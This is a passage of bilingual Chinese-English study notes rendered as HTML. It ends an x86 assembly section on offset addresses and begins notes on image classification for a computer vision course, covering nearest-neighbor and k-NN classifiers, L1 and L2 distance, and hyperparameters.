<li>变量的偏移地址，标号的偏移地址，例如
<div class="language-ASM highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-asm-wk3-__codelineno-1-1"></a><span class="c1">;数据段</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-asm-wk3-__codelineno-1-2"></a><span class="nf">bvar</span><span class="w"> </span><span class="kt">byte</span><span class="w"> </span><span class="mh">01h</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-cs-asm-wk3-__codelineno-1-3"></a><span class="c1">;代码段</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-cs-asm-wk3-__codelineno-1-4"></a><span class="nl">labl:</span><span class="w"> </span><span class="nf">mov</span><span class="w"> </span><span class="nb">bx</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-cs-asm-wk3-__codelineno-1-5"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">edi</span><span class="p">,</span><span class="nv">labl</span><span class="c1">;labl的偏移地址</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-cs-asm-wk3-__codelineno-1-6"></a><span class="nf">mov</span><span class="w"> </span><span class="nb">ax</span><span class="p">,</span><span class="nv">offset</span><span class="w"> </span><span class="nv">bvar</span><span class="c1">;变量的偏移地址</span>
</span></code></pre></div></li>
</ul>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>立即数本身没有类型，它的类型可以根据对应的寄存器或者变量类型决定</p>
</div>
<table>
<thead>
<tr>
<th>符号</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>i8</td>
<td>8位立即数</td>
</tr>
<tr>
<td>i16</td>
<td>16为立即数</td>
</tr>
<tr>
<td>i32</td>
<td>32位立即数</td>
</tr>
<tr>
<td>imm</td>
<td>立即数</td>
</tr>
</tbody>
</table></section></section></section>
                    <section class='print-page md-section' id='section-2-4-5' heading-number='2.4.5'>
                        <h1>计算机视觉 (Computer Vision)<a class='headerlink' href='#section-2-4-5' title='Permanent link'></a>
                        </h1>
                    <section class="print-page" id="note-cs-cv" heading-number="2.4.5.1"><h1 id="note-cs-cv-computer-vision">Computer Vision<a class="headerlink" href="#note-cs-cv-computer-vision" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 66 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间不到 1 分钟</p>
</div>
<p>学习 Deep Learning for Computer Vision Winter 2022 的笔记。</p>
<p>课程链接：<a href="https://web.eecs.umich.edu/~justincj/teaching/eecs498/WI2022/schedule.html">Deep Learning for Computer Vision Winter 2022</a></p>
<p>目录:</p>
<ul class="task-list">
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec1">Image Classification</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec2">Linear Classifiers</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec3">Optimization</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec4">Neural Networks</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec5">Backpropagation</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec6">Convolutional Neural Networks</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec7_8">CNN Architectures</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec9_10">Training Neural Networks</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec11_12">Software in CV</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec13_15">Object Detection</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec16">Recurrent Neural Networks</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec17">Attention</a></li>
<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled checked/><span class="task-list-indicator"></span></label> <a href="#note-cs-cv-lec21">visualizing</a></li>
</ul></section><section class="print-page" id="note-cs-cv-lec1" heading-number="2.4.5.2"><h1 id="note-cs-cv-lec1-image-classification">Image Classification<a class="headerlink" href="#note-cs-cv-lec1-image-classification" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 1837 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 68 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 12 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 7 分钟</p>
</div>
<h2 id="note-cs-cv-lec1-intro">Intro<a class="headerlink" href="#note-cs-cv-lec1-intro" title="Permanent link">&para;</a></h2>
<h3 id="note-cs-cv-lec1-introduction">Introduction<a class="headerlink" href="#note-cs-cv-lec1-introduction" title="Permanent link">&para;</a></h3>
<p>Image classification is the task of assigning an input image one label from a fixed set of categories. This is one of the core problems in Computer Vision that, despite its simplicity, has a large variety of practical applications.</p>
<h3 id="note-cs-cv-lec1-problems">Problems<a class="headerlink" href="#note-cs-cv-lec1-problems" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>Semantic Gap: the gap between low-level visual features and high-level concepts.For
a particular image, what computer sees is just a big grid of numbers, and it has no idea what the image is about.</p>
</li>
<li>
<p>Viewpoint variation: A single instance of an object can be oriented in many ways with respect to the camera.When the Camera is moves,all the pixels in the image will change.</p>
</li>
<li>
<p>Intra-class variation: Objects of the same class can look quite different in terms of their appearance.</p>
</li>
</ul>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-1.png" width="50%">
</div>

<ul>
<li>Fine-Grained Categories: Distinguishing between different fine-grained categories, such as dog breeds.</li>
</ul>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-2.png" width="50%">
</div>

<ul>
<li>Background clutter: The presence of other objects in the scene.</li>
</ul>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-3.png" width="50%">
</div>

<ul>
<li>Illumination: The effects of illumination on the pixel values of the image.</li>
</ul>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-4.png" width="50%">
</div>

<ul>
<li>Deformation: Objects can change shape.</li>
</ul>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-6.png" width="50%">
</div>

<ul>
<li>Occlusion: Objects can be occluded.</li>
</ul>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-5.png" width="50%">
</div>

<p>图像分类十分有用，例如可以用来做图片字幕</p>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-7.png" width="50%">
</div>

<p>依次识别背景的蓝天，人物，马，海滩等等，可以组成一个句子“a person riding a horse on the beach under the blue sky”。</p>
<p>还可以用来识别棋盘然后下棋......</p>
<p>A Image Classifier may look like this:</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-cs-cv-lec1-__codelineno-0-1"></a><span class="k">def</span> <span class="nf">classify_image</span><span class="p">(</span><span class="n">image</span><span class="p">):</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-cs-cv-lec1-__codelineno-0-2"></a>    <span class="c1"># Some magic here</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-cs-cv-lec1-__codelineno-0-3"></a>    <span class="k">return</span> <span class="n">class_label</span>
</span></code></pre></div>
<p>Unlike sorting a list of numbers,there is no obvious way to hard-code the algorithm for recognizing objects in images.</p>
<p>Machine Learning is a Data-Driven Approach.</p>
<ol>
<li>Collect a dataset of images and labels.</li>
<li>Use Machine Learning to train a classifier.</li>
<li>Evaluate the classifier on a new image.</li>
</ol>
<p>Eg.MNIST is a dataset of handwritten digits.</p>
<ul>
<li>10 classes (one for each of the 10 digits).</li>
<li>00,000 training images and 10,000 test images.</li>
<li>Regarded as the "Drosophila" of Computer Vision.</li>
</ul>
<p>EG.CIFAR-10 is another popular dataset.
This dataset consists of 60,000 tiny images that are 32 pixels high and wide. Each image is labeled with one of 10 classes (for example “airplane, automobile, bird, etc”). These 60,000 images are partitioned into a training set of 50,000 images and a test set of 10,000 images</p>
<h2 id="note-cs-cv-lec1-nearest-neighbor">Nearest Neighbor<a class="headerlink" href="#note-cs-cv-lec1-nearest-neighbor" title="Permanent link">&para;</a></h2>
<div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-cs-cv-lec1-__codelineno-1-1"></a><span class="k">def</span> <span class="nf">train</span><span class="p">(</span><span class="n">images</span><span class="p">,</span> <span class="n">labels</span><span class="p">):</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-cs-cv-lec1-__codelineno-1-2"></a>    <span class="c1"># machine learning</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-cs-cv-lec1-__codelineno-1-3"></a>    <span class="k">return</span> <span class="n">model</span>
</span></code></pre></div>
<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#note-cs-cv-lec1-__codelineno-2-1"></a><span class="k">def</span> <span class="nf">predict</span><span class="p">(</span><span class="n">model</span><span class="p">,</span> <span class="n">test_images</span><span class="p">):</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#note-cs-cv-lec1-__codelineno-2-2"></a>    <span class="c1"># use model to predict labels</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#note-cs-cv-lec1-__codelineno-2-3"></a>    <span class="k">return</span> <span class="n">test_labels</span>
</span></code></pre></div>
<p>Distance Metric to compare images</p>
<h3 id="note-cs-cv-lec1-l1-distance">L1 distance<a class="headerlink" href="#note-cs-cv-lec1-l1-distance" title="Permanent link">&para;</a></h3>
<div class="arithmatex">\[
   d_1(I_1, I_2) = \sum_p |I_1^p - I_2^p|
\]</div>
<p>即对于每个像素点，计算两个图像对应像素点的差的绝对值，然后求和。</p>
<p>例如</p>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-8.png" width="50%">
</div>

<p>例如，对于CIFAR-10数据集；</p>
<p><div class="language-python highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#note-cs-cv-lec1-__codelineno-3-1"></a><span class="n">Xtr</span><span class="p">,</span> <span class="n">Ytr</span><span class="p">,</span> <span class="n">Xte</span><span class="p">,</span> <span class="n">Yte</span> <span class="o">=</span> <span class="n">load_CIFAR10</span><span class="p">(</span><span class="s1">&#39;data/cifar10/&#39;</span><span class="p">)</span> <span class="c1"># a magic function we provide</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#note-cs-cv-lec1-__codelineno-3-2"></a><span class="c1"># flatten out all images to be one-dimensional</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#note-cs-cv-lec1-__codelineno-3-3"></a><span class="n">Xtr_rows</span> <span class="o">=</span> <span class="n">Xtr</span><span class="o">.</span><span class="n">reshape</span><span class="p">(</span><span class="n">Xtr</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span> <span class="c1"># Xtr_rows becomes 50000 x 3072</span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#note-cs-cv-lec1-__codelineno-3-4"></a><span class="n">Xte_rows</span> <span class="o">=</span> <span class="n">Xte</span><span class="o">.</span><span class="n">reshape</span><span class="p">(</span><span class="n">Xte</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">32</span> <span class="o">*</span> <span class="mi">3</span><span class="p">)</span> <span class="c1"># Xte_rows becomes 10000 x 3072</span>
</span></code></pre></div>
其中<code>Xtr,Xte</code>是训练集和测试集，<code>Ytr,Yte</code>是对应的标签。载入后将其拉伸为行</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#note-cs-cv-lec1-__codelineno-4-1"></a><span class="n">nn</span> <span class="o">=</span> <span class="n">NearestNeighbor</span><span class="p">()</span> <span class="c1"># create a Nearest Neighbor classifier class</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#note-cs-cv-lec1-__codelineno-4-2"></a><span class="n">nn</span><span class="o">.</span><span class="n">train</span><span class="p">(</span><span class="n">Xtr_rows</span><span class="p">,</span> <span class="n">Ytr</span><span class="p">)</span> <span class="c1"># train the classifier on the training images and labels</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#note-cs-cv-lec1-__codelineno-4-3"></a><span class="n">Yte_predict</span> <span class="o">=</span> <span class="n">nn</span><span class="o">.</span><span class="n">predict</span><span class="p">(</span><span class="n">Xte_rows</span><span class="p">)</span> <span class="c1"># predict labels on the test images</span>
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#note-cs-cv-lec1-__codelineno-4-4"></a><span class="c1"># and now print the classification accuracy, which is the average number</span>
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#note-cs-cv-lec1-__codelineno-4-5"></a><span class="c1"># of examples that are correctly predicted (i.e. label matches)</span>
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#note-cs-cv-lec1-__codelineno-4-6"></a><span class="nb">print</span> <span class="s1">&#39;accuracy: </span><span class="si">%f</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span> <span class="n">np</span><span class="o">.</span><span class="n">mean</span><span class="p">(</span><span class="n">Yte_predict</span> <span class="o">==</span> <span class="n">Yte</span><span class="p">)</span> <span class="p">)</span>
</span></code></pre></div>
<div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#note-cs-cv-lec1-__codelineno-5-1"></a><span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="nn">np</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#note-cs-cv-lec1-__codelineno-5-2"></a>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#note-cs-cv-lec1-__codelineno-5-3"></a><span class="k">class</span> <span class="nc">NearestNeighbor</span><span class="p">(</span><span class="nb">object</span><span class="p">):</span>
</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#note-cs-cv-lec1-__codelineno-5-4"></a>  <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#note-cs-cv-lec1-__codelineno-5-5"></a>    <span class="k">pass</span>
</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#note-cs-cv-lec1-__codelineno-5-6"></a>
</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#note-cs-cv-lec1-__codelineno-5-7"></a>  <span class="k">def</span> <span class="nf">train</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">X</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#note-cs-cv-lec1-__codelineno-5-8"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot; X is N x D where each row is an example. Y is 1-dimension of size N &quot;&quot;&quot;</span>
</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#note-cs-cv-lec1-__codelineno-5-9"></a>    <span class="c1"># the nearest neighbor classifier simply remembers all the training data</span>
</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#note-cs-cv-lec1-__codelineno-5-10"></a>    <span class="bp">self</span><span class="o">.</span><span class="n">Xtr</span> <span class="o">=</span> <span class="n">X</span>
</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#note-cs-cv-lec1-__codelineno-5-11"></a>    <span class="bp">self</span><span class="o">.</span><span class="n">ytr</span> <span class="o">=</span> <span class="n">y</span>
</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#note-cs-cv-lec1-__codelineno-5-12"></a>
</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#note-cs-cv-lec1-__codelineno-5-13"></a>  <span class="k">def</span> <span class="nf">predict</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">X</span><span class="p">):</span>
</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#note-cs-cv-lec1-__codelineno-5-14"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot; X is N x D where each row is an example we wish to predict label for &quot;&quot;&quot;</span>
</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#note-cs-cv-lec1-__codelineno-5-15"></a>    <span class="n">num_test</span> <span class="o">=</span> <span class="n">X</span><span class="o">.</span><span class="n">shape</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#note-cs-cv-lec1-__codelineno-5-16"></a>    <span class="c1"># lets make sure that the output type matches the input type</span>
</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#note-cs-cv-lec1-__codelineno-5-17"></a>    <span class="n">Ypred</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">zeros</span><span class="p">(</span><span class="n">num_test</span><span class="p">,</span> <span class="n">dtype</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ytr</span><span class="o">.</span><span class="n">dtype</span><span class="p">)</span>
</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#note-cs-cv-lec1-__codelineno-5-18"></a>
</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#note-cs-cv-lec1-__codelineno-5-19"></a>    <span class="c1"># loop over all test rows</span>
</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20" href="#note-cs-cv-lec1-__codelineno-5-20"></a>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_test</span><span class="p">):</span>
</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21" href="#note-cs-cv-lec1-__codelineno-5-21"></a>      <span class="c1"># find the nearest training image to the i&#39;th test image</span>
</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22" href="#note-cs-cv-lec1-__codelineno-5-22"></a>      <span class="c1"># using the L1 distance (sum of absolute value differences)</span>
</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23" href="#note-cs-cv-lec1-__codelineno-5-23"></a>      <span class="n">distances</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">abs</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">Xtr</span> <span class="o">-</span> <span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">,:]),</span> <span class="n">axis</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24" href="#note-cs-cv-lec1-__codelineno-5-24"></a>      <span class="n">min_index</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">argmin</span><span class="p">(</span><span class="n">distances</span><span class="p">)</span> <span class="c1"># get the index with smallest distance</span>
</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25" href="#note-cs-cv-lec1-__codelineno-5-25"></a>      <span class="n">Ypred</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">ytr</span><span class="p">[</span><span class="n">min_index</span><span class="p">]</span> <span class="c1"># predict the label of the nearest example</span>
</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26" href="#note-cs-cv-lec1-__codelineno-5-26"></a>
</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27" href="#note-cs-cv-lec1-__codelineno-5-27"></a>    <span class="k">return</span> <span class="n">Ypred</span>
</span></code></pre></div>
<h3 id="note-cs-cv-lec1-l2-distance">L2 distance<a class="headerlink" href="#note-cs-cv-lec1-l2-distance" title="Permanent link">&para;</a></h3>
<p>There are many other ways of computing distances between vectors. Another common choice could be to instead use the L2 distance, which has the geometric interpretation of computing the euclidean distance between two vectors. The distance takes the form:</p>
<div class="arithmatex">\[
d_2(I_1, I_2) = \sqrt{\sum_p (I_1^p - I_2^p)^2}
\]</div>
<p>即对于每个像素点，计算两个图像对应像素点的差的平方，然后求和，最后开根号。</p>
<div class="language-python highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#note-cs-cv-lec1-__codelineno-6-1"></a><span class="n">distances</span> <span class="o">=</span> <span class="n">np</span><span class="o">.</span><span class="n">sqrt</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">sum</span><span class="p">(</span><span class="n">np</span><span class="o">.</span><span class="n">square</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">Xtr</span> <span class="o">-</span> <span class="n">X</span><span class="p">[</span><span class="n">i</span><span class="p">,:]),</span> <span class="n">axis</span> <span class="o">=</span> <span class="mi">1</span><span class="p">))</span>
</span></code></pre></div>
<p>在实际上的效果上，由于sqrt函数是单调递增的，即使不使用sqrt函数，也不会影响最终的结果。</p>
<div class="admonition info">
<p class="admonition-title">L1 vs L2</p>
<ol>
<li>
<p>L2距离的平方项意味着它对大差异非常敏感。例如，如果在某一维度上两个向量的差异很大，那么L2距离会显著增加。L2距离不喜欢大差异，认为大差异是很不理想的。换句话说，L2距离更“惩罚”大的误差，因为它把误差平方了。所以即使有一个维度的差异很大，L2距离也会显著增大整体距离。</p>
</li>
<li>
<p>L1距离对小差异更“宽容”：L1距离对差异的惩罚是线性的，即每个维度的差异直接相加。如果一个维度的差异特别大，它对整体距离的影响和L2距离相比就会小很多。因此，L1距离对于大的差异“宽容”一些。在某些情况下，L1距离更适用于忽略一些较小的误差，关注更明显的差异。</p>
</li>
<li>
<p>L2距离的敏感性意味着它会倾向于较小的、均匀的差异，而不太容易接受某一维度上的大差异。比如，如果两个向量在多个维度上有些许的差异，那么L2距离会认为这些小差异比一个大的差异更为“平滑”。</p>
</li>
<li>
<p>换句话说，L2距离在多个维度上拥有较小差异时，它会显示出较小的距离，即使某些维度的差异可能不那么显著；但如果某一维度的差异特别大，L2距离会非常敏感。</p>
</li>
<li>
<p>L1距离和L2距离其实是 p-norm 的两个特殊情况。p-norm的形式是：</p>
</li>
</ol>
<div class="arithmatex">\[
||\mathbf{v}||_p = \left( \sum_{i=1}^{n} |v_i|^p \right)^{1/p}
\]</div>
<p>其中，p=1 时就是 L1 范数，p=2 时就是 L2 范数。</p>
<ul>
<li>这两者是最常用的p-norm度量，它们被广泛应用于机器学习、优化、图像处理等领域。</li>
</ul>
</div>
<h3 id="note-cs-cv-lec1-k-nearest-neighbor">K-Nearest Neighbor<a class="headerlink" href="#note-cs-cv-lec1-k-nearest-neighbor" title="Permanent link">&para;</a></h3>
<p>K-Nearest Neighbor (KNN) is a simple idea: when you want to classify an example, you compare it to all examples in your training set. Then you find the most similar examples (the nearest neighbors) and classify your example based on the majority class among the K-nearest neighbors.(Find the top k nearest neighbors and have them vote on the label)</p>
<p>On the figure below,points are training data, and the colors are their labels.</p>
<div align="center">
    <img src="../NOTE/CS/CV/img/lec1-9.png" width="80%">
</div>

<blockquote>
<p>An example of the difference between Nearest Neighbor and a 5-Nearest Neighbor classifier, using 2-dimensional points and 3 classes (red, blue, green). The colored regions show the decision boundaries induced by the classifier with an L2 distance. The white regions show points that are ambiguously classified (i.e. class votes are tied for at least two classes). Notice that in the case of a NN classifier, outlier datapoints (e.g. green point in the middle of a cloud of blue points) create small islands of likely incorrect predictions, while the 5-NN classifier smooths over these irregularities, likely leading to better generalization on the test data (not shown). Also note that the gray regions in the 5-NN image are caused by ties in the votes among the nearest neighbors (e.g. 2 neighbors are red, next two neighbors are blue, last neighbor is green).</p>
</blockquote>
<p>K-NN 方法固然很好，但是我们需要考虑K取什么值是最好的</p>
<p>像K-NN算法中的K这样一开始无法确定的参数，我们称之为超参数(Hyperparameters)。超参数是在开始学习过程之前设置的参数，并且不断调整来取得更好的效果。在这里，K和距离度量（L1或L2）就是超参数。</p>
<h3 id="note-cs-cv-lec1-ideas-of-setting-hyperparameters">Ideas of setting hyperparameters<a class="headerlink" href="#note-cs-cv-lec1-ideas-of-setting-hyperparameters" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p>Choose hyperparameters that work best on the data(BAD IDEA: K = 1 always works
perfectly on training data)</p>
</li>
<li>
<p>Split the data into training,and test sets(BAD IDEA:No idea how algorithm
will perform on new data)</p>
</li>
<li>
<p>Spit the data into training,validation,and test sets(GOOD IDEA:Use validation set to tune hyperparameters)</p>
</li>
</ul>
<p>Eg.
